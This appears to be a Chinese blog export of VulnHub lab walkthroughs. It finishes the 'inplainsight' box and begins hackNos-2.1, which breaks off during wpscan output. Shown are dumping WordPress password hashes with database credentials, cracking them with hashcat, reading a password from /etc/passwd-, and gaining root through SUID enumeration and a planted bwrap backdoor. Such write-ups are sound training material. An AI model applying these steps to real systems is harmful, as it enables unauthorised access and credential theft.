<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@inplainsight:/var/www/html/so-dev-wordpress$ mysql -usodevwp -poZ2R3c2x7dLL6<span class="comment">#hJ</span></span><br><span class="line">&lt;o-dev-wordpress$ mysql -usodevwp -poZ2R3c2x7dLL6<span class="comment">#hJ  </span></span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 9805</span><br><span class="line">Server version: 10.3.20-MariaDB-0ubuntu0.19.10.1 Ubuntu 19.10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| sodevwp            |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use sodevwp;</span><br><span class="line">use sodevwp;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [sodevwp]&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+----------------------------+</span><br><span class="line">| Tables_in_sodevwp          |</span><br><span class="line">+----------------------------+</span><br><span class="line">| sodevwp_commentmeta        |</span><br><span class="line">| sodevwp_comments           |</span><br><span class="line">| sodevwp_links              |</span><br><span class="line">| sodevwp_options            |</span><br><span class="line">| sodevwp_postmeta           |</span><br><span class="line">| sodevwp_posts              |</span><br><span class="line">| sodevwp_term_relationships |</span><br><span class="line">| sodevwp_term_taxonomy      |</span><br><span class="line">| sodevwp_termmeta           |</span><br><span class="line">| sodevwp_terms              |</span><br><span class="line">| sodevwp_usermeta           |</span><br><span class="line">| sodevwp_users              |</span><br><span class="line">+----------------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [sodevwp]&gt; select * from sodevwp_users;</span><br><span class="line">select * from sodevwp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | admin      | <span class="variable">$P</span><span class="variable">$BD</span>/ZmfBIhgjHKtkLpPKfhr2t5EDgZA. | admin         | admin@local.lan |          | 2019-11-22 03:41:57 |                     |           0 | admin        |</span><br><span class="line">|  2 | mike       | <span class="variable">$P</span><span class="variable">$B3halPOgh4jqI1tDelkv5TGAHnaOC01</span> | mike          | mike@local.lan  |          | 2019-11-22 03:44:25 |                     |           0 | mike         |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>成功使用上述命令后，将发现以下两个hash值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$P</span><span class="variable">$BD</span>/ZmfBIhgjHKtkLpPKfhr2t5EDgZA.(admin)</span><br><span class="line"><span class="variable">$P</span><span class="variable">$B3halPOgh4jqI1tDelkv5TGAHnaOC01</span>(mike)</span><br></pre></td></tr></table></figure>

<p>将2条hash值保存后，用hashcat破解如下所示，电脑是GTX-1070 8GB显存的显卡，一秒出密码，非常给力，比用john破解快多了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\hashcat-5.1.0\hashcat-5.1.0&gt;hashcat64.exe -a 0 -m 400 password.txt D:/wordlists/rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: Intel&#x27;s OpenCL runtime (GPU only) is currently broken.</span></span><br><span class="line">             We are waiting <span class="keyword">for</span> updated OpenCL drivers from Intel.</span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">* Device <span class="comment">#3: WARNING! Kernel exec timeout is not disabled.</span></span><br><span class="line">             This may cause <span class="string">&quot;CL_OUT_OF_RESOURCES&quot;</span> or related errors.</span><br><span class="line">             To <span class="built_in">disable</span> the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">nvmlInit(): Unknown Error</span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#1: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#1: Intel(R) UHD Graphics 630, skipped.</span></span><br><span class="line">* Device <span class="comment">#2: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: NVIDIA Corporation</span></span><br><span class="line">======================================</span><br><span class="line">* Device <span class="comment">#3: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU</span></span><br><span class="line"></span><br><span class="line">Hashes: 2 digests; 2 unique digests, 2 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) OpenCL kernels selected.</span><br><span class="line">This enables cracking passwords and salts &gt; length 32 but <span class="keyword">for</span> the price of drastically reduced performance.</span><br><span class="line">If you want to switch to optimized OpenCL kernels, append -O to your commandline.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: D:/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344360</span><br><span class="line">* Bytes.....: 139921318</span><br><span class="line">* Keyspace..: 14344360</span><br><span class="line"></span><br><span class="line"><span class="variable">$P</span><span class="variable">$B3halPOgh4jqI1tDelkv5TGAHnaOC01</span>:skuxdelux</span><br><span class="line"><span class="variable">$P</span><span class="variable">$BD</span>/ZmfBIhgjHKtkLpPKfhr2t5EDgZA.:admin1</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: phpass, WordPress (MD5), phpBB3 (MD5), Joomla (MD5)</span><br><span class="line">Hash.Target......: password.txt</span><br><span class="line">Time.Started.....: Mon Jan 13 11:20:12 2020 (2 secs)</span><br><span class="line">Time.Estimated...: Mon Jan 13 11:20:14 2020 (0 secs)</span><br><span class="line">Guess.Base.......: File (D:/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#3.........:  1199.8 kH/s (6.61ms) @ Accel:512 Loops:128 Thr:64 Vec:1</span></span><br><span class="line">Recovered........: 2/2 (100.00%) Digests, 2/2 (100.00%) Salts</span><br><span class="line">Progress.........: 1048576/28688720 (3.66%)</span><br><span class="line">Rejected.........: 0/1048576 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344360 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:1 Amplifier:0-1 Iteration:8064-8192</span></span><br><span class="line">Candidates.<span class="comment">#3....: 123456 -&gt; chadj85</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Mon Jan 13 11:20:09 2020</span><br><span class="line">Stopped: Mon Jan 13 11:20:15 2020</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub154.jpg"></p>
<p>得到两个密码：<br>admin/admin1<br>mike/skuxdelux</p>
<p>现在，将用户切换为Mike，可以如下观察到可以成功完成操作,这意味着破解密码成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@inplainsight:/var/www/html/so-dev-wordpress$ su admin</span><br><span class="line">su admin</span><br><span class="line">su: user admin does not exist</span><br><span class="line">www-data@inplainsight:/var/www/html/so-dev-wordpress$ </span><br><span class="line"></span><br><span class="line">www-data@inplainsight:/var/www/html/so-dev-wordpress$ su mike</span><br><span class="line">su mike</span><br><span class="line">Password: skuxdelux</span><br><span class="line"></span><br><span class="line">mike@inplainsight:/var/www/html/so-dev-wordpress$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(mike) gid=1000(mike) groups=1000(mike)</span><br><span class="line">mike@inplainsight:/var/www/html/so-dev-wordpress$ whoami</span><br><span class="line">whoami</span><br><span class="line">mike</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>继续进行特权升级。现在，当您将目录更改为/home时，会发现一个新用户“joe”并且不浪费任何时间，我们遍历了/etc/passwd。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@inplainsight:~$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:106:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:107:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:108:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/<span class="literal">false</span></span><br><span class="line">mike:x:1000:1000:mike,,,:/home/mike:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">postfix:x:112:120::/var/spool/postfix:/usr/sbin/nologin</span><br><span class="line">ftp:x:113:122:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">joe:x:1001:1001:hyphens rule:/home/joe:/bin/bash</span><br></pre></td></tr></table></figure>

<p>没有发现joe用户的密码，继续遍历passwd-</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@inplainsight:/etc$ cat passwd-</span><br><span class="line">cat passwd-</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:106:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:107:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:108:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/<span class="literal">false</span></span><br><span class="line">mike:x:1000:1000:mike,,,:/home/mike:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">postfix:x:112:120::/var/spool/postfix:/usr/sbin/nologin</span><br><span class="line">ftp:x:113:122:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">joe:x:1001:1001:joe:SmashMouthNoThanks:/home/joe:/bin/bash</span><br></pre></td></tr></table></figure>

<p>得到用户密码:joe/SmashMouthNoThanks，然后切换到joe用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@inplainsight:/etc$ su joe</span><br><span class="line">su joe</span><br><span class="line">Password: SmashMouthNoThanks</span><br><span class="line"></span><br><span class="line">joe@inplainsight:/etc$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(joe) gid=1001(joe) groups=1001(joe)</span><br><span class="line">joe@inplainsight:/etc$ whoami</span><br><span class="line">whoami</span><br><span class="line">joe</span><br><span class="line">joe@inplainsight:/$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">joe@inplainsight:/home$ ls</span><br><span class="line">ls</span><br><span class="line">joe  mike</span><br><span class="line">joe@inplainsight:/home$ <span class="built_in">cd</span> joe</span><br><span class="line"><span class="built_in">cd</span> joe</span><br><span class="line">joe@inplainsight:~$ ls  </span><br><span class="line">ls</span><br><span class="line">journal</span><br><span class="line">joe@inplainsight:~$ cat journal</span><br><span class="line">cat journal</span><br><span class="line">glad i added that root backdoor before boss person removed my privileges :)</span><br></pre></td></tr></table></figure>

<p>意思是，系统中已经有别人先添加好的后门了,要做的唯一一件事就是获取目标的最后一个flag。为了得到它，我们使用命令find查找SUID。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>在执行此命令之前，我们将目录更改为“/”，并在运行该命令后找到以下有用的二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joe@inplainsight:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/bin/bwrap</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br></pre></td></tr></table></figure>

<p>在/bwrap中，找到了最后一个flag，如下图：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joe@inplainsight:~$ bwrap</span><br><span class="line">bwrap</span><br><span class="line">root@inplainsight:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(joe)</span><br><span class="line">root@inplainsight:~<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@inplainsight:~<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@inplainsight:/root<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">root@inplainsight:/root<span class="comment"># cat flag.txt</span></span><br><span class="line">cat flag.txt</span><br><span class="line"></span><br><span class="line">                                          __          </span><br><span class="line">  ____  ____   ____    ________________ _/  |_  ______</span><br><span class="line">_/ ___\/  _ \ /    \  / ___\_  __ \__  \\   __\/  ___/</span><br><span class="line">\  \__(  &lt;_&gt; )   |  \/ /_/  &gt;  | \// __ \|  |  \___ \ </span><br><span class="line"> \___  &gt;____/|___|  /\___  /|__|  (____  /__| /____  &gt;</span><br><span class="line">     \/           \//_____/            \/          \/ </span><br><span class="line"></span><br><span class="line">easy right? thanks <span class="keyword">for</span> playing.</span><br><span class="line"></span><br><span class="line">feel free to leave feedback with me @bzyo_</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub155.jpg"></p>
<p>成功提权，帅的一批。。。</p>
<ul>
<li>知识点：wordpress文件上传</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[hackNos-Os-hackNos-2-1]</title>
    <url>/2019/12/19/hackNos-Os-hackNos-2-1/</url>
    <content><![CDATA[<p>名称：hackNos：Os-hackNos-2.1<br>发布日期：29 Nov 2019</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MVVzemZxb29tbTdpdl9jNGFpdU5iNlVQbDhaZ2Z2NThz">https://drive.google.com/open?id=1Uszfqoomm7iv_c4aiuNb6UPl8Zgfv58s<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbm9zL09zLWhhY2tOb3MtMi4xLm92YQ==">https://download.vulnhub.com/hacknos/Os-hackNos-2.1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbm9zL09zLWhhY2tOb3MtMi4xLm92YS50b3JyZW50">https://download.vulnhub.com/hacknos/Os-hackNos-2.1.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>难度：容易中级</p>
<p>flag：2个flag第一个user和第二个root</p>
<p>学习：Web应用程序 枚举 密码破解</p>
<a id="more"></a>

<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>由于此靶机使用virtualbox导出的ova文件，无法适应vmware的网络配置，故将靶机放在vbox中，而攻击机kali放在vmware中，网络如下图配置方能让两台机器相互通信</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub71.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub72.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub73.jpg"></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:89:DE:B1 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.56.101</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /tsweb/: Remote Desktop Web Connection</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br></pre></td></tr></table></figure>

<p>开了2个端口，然后dirb目录扫一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.101/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Dec 19 00:38:44 2019</span><br><span class="line">URL_BASE: http://192.168.56.101/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.101/ ----</span><br><span class="line">+ http://192.168.56.101/index.html (CODE:200|SIZE:10918)                                              </span><br><span class="line">+ http://192.168.56.101/server-status (CODE:403|SIZE:279)                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/                                                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/index.php (CODE:301|SIZE:0)                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-includes/                                               </span><br><span class="line">+ http://192.168.56.101/tsweb/xmlrpc.php (CODE:405|SIZE:42)                                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-admin/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/admin.php (CODE:302|SIZE:0)                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/css/                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/images/                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/includes/                                         </span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/index.php (CODE:302|SIZE:0)                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/js/                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/maint/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/network/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/user/                                             </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-content/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-content/index.php (CODE:200|SIZE:0)                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/plugins/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/themes/                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/upgrade/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/uploads/                                   </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/network/admin.php (CODE:302|SIZE:0)                            </span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/network/index.php (CODE:302|SIZE:0)                            </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/user/admin.php (CODE:302|SIZE:0)                               </span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/user/index.php (CODE:302|SIZE:0)                               </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-content/plugins/index.php (CODE:200|SIZE:0)                          </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-content/themes/index.php (CODE:200|SIZE:0)                           </span><br><span class="line">                                                                                                                      </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Dec 19 00:39:22 2019</span><br><span class="line">DOWNLOADED: 36896 - FOUND: 13</span><br></pre></td></tr></table></figure>

<p>可以发现是wordpress程序搭建的,wpscan一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.101/tsweb/ -e ap,at,tt,cb</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.5</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, 